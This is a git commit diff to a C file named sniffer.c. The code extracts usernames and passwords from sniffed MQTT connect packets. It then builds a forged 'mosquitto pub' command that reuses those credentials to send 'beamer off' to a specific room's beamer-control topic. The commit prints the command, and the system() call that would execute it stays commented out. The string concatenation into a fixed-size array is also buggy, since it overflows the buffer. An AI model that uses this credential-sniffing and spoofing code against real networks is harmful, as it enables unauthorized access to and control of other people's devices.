a40a22c86b401b9ef3c520f58f128078d59e8206
NilsBaumgartner <mllerpeter68@yahoo.de>
2016-11-20 03:51:03 +0100

    Update sniffer.c

--- sniffer.c
+++ sniffer.c
@@ -256,15 +256,15 @@ int filter_connect_flags(unsigned char* data_payload, int Size, int remaining_le
   pos = filter_password(data_payload, Size, remaining_length, pos);
  }
  
- printf("\n\nSende gefälschte Nachricht los!");
+ printf("\n\n");
  
  //TODO hier gefälschte nachricht absenden
  
  char cmd[] = "mosquitto pub -m \"beamer off\" -t \"/uos/93/E06/beamer-control\" -u ";
- strcat(cmd,&user_name);
+ strcat(cmd,user_name);
  strcat(cmd," -P ");
- strcat(cmd,&password);
- //printf("Running Command: %s\n",cmd);
+ strcat(cmd,password);
+ printf("Running Command: %s\n",cmd);
  //system(cmd);
  printf("\n\n");
  
